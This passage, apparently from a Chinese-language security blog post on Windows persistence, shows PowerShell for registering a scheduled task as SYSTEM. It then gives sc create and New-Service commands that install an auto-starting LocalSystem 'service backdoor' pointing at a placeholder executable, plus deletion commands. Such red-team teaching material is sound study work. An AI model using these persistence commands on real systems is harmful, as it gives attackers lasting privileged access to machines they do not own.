class="hljs-built_in">New-ScheduledTaskPrincipal</span> <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="hljs-literal">-RunLevel</span> Highest<br><span class="hljs-variable">$S</span> = <span class="hljs-built_in">New-ScheduledTaskSettingsSet</span><br><span class="hljs-variable">$D</span> = <span class="hljs-built_in">New-ScheduledTask</span> <span class="hljs-literal">-Action</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Trigger</span> <span class="hljs-variable">$T</span> <span class="hljs-literal">-Principal</span> <span class="hljs-variable">$P</span> <span class="hljs-literal">-Settings</span> <span class="hljs-variable">$S</span><br><span class="hljs-built_in">Register-ScheduledTask</span> PentestLaboratories <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$D</span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="4-服务后门"><a href="#4-服务后门" class="headerlink" title="4.服务后门"></a>4.服务后门</h2><p>​    如果未正确配置Windows环境中的服务或这些服务可以用作持久性方法，则这些服务可能导致权限提升。创建一个新的服务需要管理员级别的特权，它已经不是隐蔽的持久性技术。然而，在红队的行动中，针对那些在威胁检测方面还不成熟的公司，可以用来制造进一步的干扰，企业应建立SOC能力，以识别在其恶意软件中使用基本技术的威胁。</p>
+<h3 id="1-命令行创建服务"><a href="#1-命令行创建服务" class="headerlink" title="1.命令行创建服务"></a>1.命令行创建服务</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">sc create pentestlab <span class="hljs-attr">binpath=</span> <span class="hljs-string">&quot;cmd.exe /k C:\temp\pentestlab.exe&quot;</span> <span class="hljs-attr">start=</span> <span class="hljs-string">&quot;auto&quot;</span> <span class="hljs-attr">obj=</span> <span class="hljs-string">&quot;LocalSystem&quot;</span><br></code></pre></td></tr></table></figure>
+<p>注意：等号和值之间需要有空格，否则会创建失败</p>
+<p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/11.png" srcset="/img/loading.gif"></p>
+<p>删除的话，用如下命令就可以了：</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">sc</span> <span class="hljs-variable">delete</span> <span class="hljs-function"><span class="hljs-title">pentestlab</span>(服务名)</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/12.png" srcset="/img/loading.gif"></p>
+<h3 id="2-使用Powershell"><a href="#2-使用Powershell" class="headerlink" title="2.使用Powershell"></a>2.使用Powershell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">New-Service</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;pentestlab&quot;</span> <span class="hljs-literal">-BinaryPathName</span> <span class="hljs-string">&quot;C:\temp\pentestlab.exe&quot;</span> <span class="hljs-literal">-Description</span> <span class="hljs-string">&quot;PentestLaboratories&quot;</span> <span class="hljs-literal">-StartupType</span> Automatic<br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> pentestlab<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/13.png" srcset="/img/loading.gif"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Java安全-CommonsCollections2分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/">
+                        <span class="hidden-mobile">简单加密+分离+进程注入绕过杀软</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
